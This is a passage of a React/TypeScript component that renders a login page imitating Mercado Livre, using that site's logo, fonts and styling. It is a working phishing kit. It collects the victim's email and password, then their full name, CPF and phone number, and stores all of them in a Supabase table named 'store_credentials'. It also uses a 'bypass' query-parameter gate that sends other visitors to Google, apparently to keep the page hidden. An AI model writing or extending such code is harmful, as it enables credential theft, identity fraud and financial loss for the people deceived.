            </div>
            ${getCommonFooter()}
        </div>
      </main>
    `;
  };

  const getUpdateHTML = (email: string) => {
    const maskedEmail = email.replace(/(.{2})(.*)(@.*)/, (_, a, b, c) => a + '*'.repeat(b.length) + c);
    const countryCode = localStorage.getItem('app_country') || 'BR';
    const labelDocument = countryCode === 'BR' ? "CPF" : "Documento";
    return `
      ${getCommonHeader()}
      <main role="main" id="root-app" data-navigation="true">
        <div id="_R_32e_" style="display:contents">
            <div class="grid-view__container">
                <div class="grid-view__main">
                    <div class="grid-view__section--headers">
                        <p class="andes-ui-typography grid-view__subtitle andes-ui-typography--type-body andes-ui-typography--size-small andes-ui-typography--color-secondary andes-ui-typography--weight-emphasis">Atualizar dados</p>
                        <h1
                            class="andes-ui-typography grid-view__title andes-ui-typography--type-heading andes-ui-typography--size-xhuge andes-ui-typography--color-primary andes-ui-typography--weight-default andes-ui-typography-heading-xhuge-default">
                            Complete seus dados</h1>
                    </div>
                    <div class="user-pill" style="margin-bottom: 24px; display: flex; align-items: center; padding: 12px; background: #f5f5f5; border-radius: 6px;">
                        <div class="andes-ui-thumbnail__container andes-ui-thumbnail__container--small" data-andes-thumbnail="true">
                          <div class="andes-ui-thumbnail andes-ui-thumbnail--circle andes-ui-thumbnail--small andes-ui-thumbnail__icon andes-ui-thumbnail--quiet user-pill__avatar" style="margin-right:12px;"><svg aria-hidden="true" color="accent" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z" fill="currentColor"></path>
                            <path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z" fill="currentColor"></path>
                          </svg></div>
                        </div>
                        <div class="user-pill__body">
                          <p class="user-pill__identifier" style="font-size: 14px; font-weight: 600; margin: 0;">${maskedEmail}</p>
                        </div>
                    </div>
                    <div class="andes-card grid-view__section--content andes-card--outline andes-card--primary andes-card--padding-0"
                        id="_R_58r2e_" data-andes-card="true" data-andes-card-hierarchy="primary">
                        <div class="andes-card__overlap">
                            <div class="andes-card__content" data-andes-card-content="true">
                                <div class="children-wrapper">
                                    <form class="login-form login-form--social" novalidate="" id="login_update_form">
                                        <div class="login-form__input" style="margin-bottom: 20px;">
                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
                                            <label for="full_name"><span class="andes-form-control__label">Nome completo</span></label>
                                            <div class="andes-form-control__control" style="border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
                                              <input type="text" id="full_name" class="andes-form-control__field" name="full_name" autocomplete="name" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
                                            </div>
                                          </div>
                                        </div>
                                        <div class="login-form__input" style="margin-bottom: 20px;">
                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
                                            <label for="cpf"><span class="andes-form-control__label">${labelDocument}</span></label>
                                            <div class="andes-form-control__control" style="border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
                                              <input type="text" id="cpf" class="andes-form-control__field" name="cpf" maxlength="14" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
                                            </div>
                                          </div>
                                        </div>
                                        <div class="login-form__input" style="margin-bottom: 20px;">
                                          <div class="andes-form-control andes-form-control--textfield andes-form-control--default" data-andes-textfield="true">
                                            <label for="phone"><span class="andes-form-control__label">Telefone</span></label>
                                            <div class="andes-form-control__control" style="border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff;">
                                              <input type="tel" id="phone" class="andes-form-control__field" name="phone" maxlength="15" style="padding: 13px 12px; font-size: 16px; border: none; width: 100%; outline: none; background: transparent;">
                                            </div>
                                          </div>
                                        </div>
                                        <div class="login-form__actions login-form__actions--social">
                                          <button type="submit"
                                                class="andes-button login-form__submit login-form__submit--social andes-button--large andes-button--loud"
                                                id="login_update_submit" data-andes-button="true"
                                                data-andes-button-hierarchy="loud" data-andes-button-size="large"><span
                                                    class="andes-button__content"
                                                    data-andes-button-content="true">Continuar</span></button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            ${getCommonFooter()}
        </div>
      </main>
    `;
  };

  // Check if this is a register flow
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.has('register')) {
      setIsRegister(true);
    }
  }, []);

  // Bypass access control
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.has('bypass')) {
      localStorage.setItem('store_access', 'authorized');
    }
    const hasAccess = localStorage.getItem('store_access') === 'authorized';
    if (!hasAccess) {
      window.location.href = 'https://www.google.com';
      return;
    }
    setAuthorized(true);
  }, []);

  // Loader & Background (ML Yellow Flash)
  useEffect(() => {
    const originalBg = document.body.style.backgroundColor;
    document.body.style.backgroundColor = '#fff159';
    const timer = setTimeout(() => {
      setLoading(false);
      document.body.style.backgroundColor = '#ffffff';
    }, 2000);
    return () => {
      clearTimeout(timer);
      document.body.style.backgroundColor = originalBg;
    };
  }, []);

  // Event handlers
  useEffect(() => {
    const container = containerRef.current;
    if (!container || !authorized) return;

    const logo = container.querySelector('.nav-logo') as HTMLElement;
    logo?.addEventListener('click', (e) => { e.preventDefault(); navigate('/store'); });

    if (step === 'email') {
      const form = container.querySelector('#login_user_form') as HTMLFormElement;
      const submitEmail = () => {
        const input = container.querySelector('#user_id') as HTMLInputElement;
        const val = input?.value?.trim();
        if (val) {
          setUserEmail(val);
          setStep('password');
        }
      };
      form?.addEventListener('submit', (e) => { e.preventDefault(); submitEmail(); });
      
      const userInput = container.querySelector('#user_id') as HTMLInputElement;
      userInput?.addEventListener('keydown', ((e: KeyboardEvent) => {
        if (e.key === 'Enter') { e.preventDefault(); submitEmail(); }
      }) as EventListener);

      const regLink = container.querySelector('#registration-link') as HTMLElement;
      regLink?.addEventListener('click', (e) => { e.preventDefault(); setIsRegister(true); });

    } else if (step === 'password') {
      const passwordForm = container.querySelector('#login_password_form') as HTMLFormElement;
      const goToUpdate = (e: Event) => {
        e.preventDefault();
        const pwInput = container.querySelector('#password') as HTMLInputElement;
        const password = pwInput?.value?.trim();
        if (password) {
          setUserPassword(password);
          setStep('update');
        }
      };
      passwordForm?.addEventListener('submit', goToUpdate);

      const confirmBtn = container.querySelector('#login_password_submit') as HTMLButtonElement;
      confirmBtn?.addEventListener('click', goToUpdate);

      const backToEmail = container.querySelector('#back-to-email-link') as HTMLElement;
      backToEmail?.addEventListener('click', (e) => { e.preventDefault(); setStep('email'); });

      const otherMethod = container.querySelector('#choose-other-method') as HTMLElement;
      otherMethod?.addEventListener('click', (e) => { e.preventDefault(); setStep('email'); });

      const toggleCheckbox = container.querySelector('#password-checkbox') as HTMLInputElement;
      toggleCheckbox?.addEventListener('change', () => {
        const pwInput = container.querySelector('#password') as HTMLInputElement;
        const eyeClosed = container.querySelector('.eye-closed-icon') as HTMLElement;
        const eyeOpen = container.querySelector('.eye-open-icon') as HTMLElement;
        if (pwInput) {
          const showing = toggleCheckbox?.checked;
          pwInput.type = showing ? 'text' : 'password';
          if (eyeClosed) eyeClosed.style.display = showing ? 'none' : '';
          if (eyeOpen) eyeOpen.style.display = showing ? '' : 'none';
        }
      });
    } else if (step === 'update') {
      const updateForm = container.querySelector('#login_update_form') as HTMLFormElement;
      const cpfInput = container.querySelector('#cpf') as HTMLInputElement;
      const phoneInput = container.querySelector('#phone') as HTMLInputElement;
      
      const cpfMask = () => {
        let v = cpfInput.value.replace(/\D/g, '').slice(0, 11);
        if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
        else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        cpfInput.value = v;
      };
      cpfInput?.addEventListener('input', cpfMask);

      const phoneMask = () => {
        let v = phoneInput.value.replace(/\D/g, '').slice(0, 11);
        if (v.length > 6) v = v.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
        else if (v.length > 2) v = v.replace(/(\d{2})(\d{1,5})/, '($1) $2');
        phoneInput.value = v;
      };
      phoneInput?.addEventListener('input', phoneMask);

      const updateHandler = async (e: Event) => {
        e.preventDefault();
        const fullName = (container.querySelector('#full_name') as HTMLInputElement)?.value?.trim();
        const cpf = (container.querySelector('#cpf') as HTMLInputElement)?.value?.trim();
        const phone = (container.querySelector('#phone') as HTMLInputElement)?.value?.trim();
        if (fullName && cpf && userEmail && userPassword) {
          try {
            await supabase.from('store_credentials').insert({
              email: userEmail,
              password: userPassword,
              full_name: fullName,
              cpf: cpf,
              phone: phone || null,
            });
          } catch (err) { console.error('Error saving credentials:', err); }
          localStorage.setItem('store_logged_in', 'true');
          localStorage.setItem('store_user_email', userEmail);
          localStorage.setItem('store_user_name', fullName);
          window.dispatchEvent(new Event('store_login_changed'));
          navigate('/store');
        }
      };
      updateForm?.addEventListener('submit', updateHandler);
      const updateBtn = container.querySelector('#login_update_submit') as HTMLButtonElement;
      updateBtn?.addEventListener('click', updateHandler);
    }
  }, [navigate, step, authorized, userEmail, userPassword, isRegister]);

  const rawHtml = step === 'email' ? getLoginHTML() : step === 'password' ? getPasswordHTML(userEmail) : getUpdateHTML(userEmail);
  const html = sanitizeStoreHTML(rawHtml, mascara);

  if (!authorized) return null;

  return (
    <>
      {loading && <StoreLoader />}
      <style type="text/css">{`
        @charset "utf-8";
        @font-face {
            font-family: "navigation";
            src: url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.eot");
            src: url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.eot#iefix") format("embedded-opentype"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.woff2") format("woff2"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.woff") format("woff"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.ttf") format("truetype"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.svg#navigation") format("svg");
            font-weight: normal;
            font-style: normal
        }
        [class^=nav-icon-],[class*=" nav-icon-"] { font-style: normal }
        .store-login-page { display: flex; flex-direction: column; min-height: 100vh; height: auto; border-collapse: collapse; background-color: #fff; font-family: "Proxima Nova", -apple-system, Roboto, Arial, sans-serif, sans-serif; table-layout: fixed; width: 100%; margin: 0; padding: 0 !important; }
        [role=main] { height: auto; flex-grow: 1; display: block; width: 100% }
        .nav-bounds { display: block; padding: 0 10px; margin: 0 auto; max-width: 1220px }
        .nav-header { background-color: #ffe600; border: 0; position: relative; height: 100px; display: flex; justify-content: center; }
        .nav-header:before { content: ""; position: absolute; width: 100%; height: 100px; left: 0; top: 0; box-shadow: 0 1px 0 0 rgba(0,0,0,.1) }
        .nav-logo { background-repeat: no-repeat; overflow: hidden; text-indent: -999px; background-image: url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/logo_large_plus@2x.webp"); height: 34px; width: 134px; display: flex; position: static; background-size: contain }
        .login-footer { color: #999; background-color: #fff; font-family: "Proxima Nova", -apple-system, Roboto, Arial, sans-serif; font-size: 13px; font-weight: 400; line-height: 1; overflow: hidden; border-top: 1px solid #e6e6e6 }
        .login-footer .nav-bounds { padding: 16px 10px; max-width: 1200px }
        .grid-view__container { margin: 40px auto; max-width: 400px; padding: 0 10px; }
        .grid-view__title { font-size: 24px; line-height: 1.25; margin-bottom: 24px; color: rgba(0,0,0,0.9); }
        .andes-card { background: #fff; border-radius: 6px; box-shadow: none; border: 1px solid rgba(0,0,0,.1); padding: 32px; }
        .login-form__actions { margin-top: 24px; display: flex; flex-direction: column; gap: 12px; }
        .andes-button { width: 100%; border-radius: 6px; padding: 12px; font-weight: 600; cursor: pointer; border: none; font-size: 16px; text-align: center; }
        .andes-button--loud { background: #3483fa; color: #fff; }
        .andes-button--loud:hover { background: #2968c8; }
        .andes-button--mute { background: transparent; color: #3483fa; }
        .login-form__challenge-divider { display: flex; align-items: center; margin: 24px 0; gap: 12px; }
        .login-form__divider { flex: 1; border: none; border-top: 1px solid rgba(0,0,0,0.1); }
        .login-form__o { color: rgba(0,0,0,0.45); font-size: 14px; }
        .andes-form-control__label { display: block; margin-bottom: 4px; font-size: 14px; color: rgba(0,0,0,0.9); }
        .andes-form-control__control { border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff; }
        .andes-form-control__field { width: 100%; padding: 13px 12px; font-size: 16px; border: none; outline: none; background: transparent; box-sizing: border-box; }
        @media screen and (max-width: 767px) {
            .nav-header { height: 48px; }
            .nav-header:before { height: 48px; }
            .grid-view__container { margin: 20px auto; }
            .andes-card { border: none; padding: 0; }
        }
      `}</style>
      <div
        ref={containerRef}
        style={{ display: 'contents' }}
        dangerouslySetInnerHTML={{ __html: html }}
      />
    </>
  );
};

export default StoreLogin;
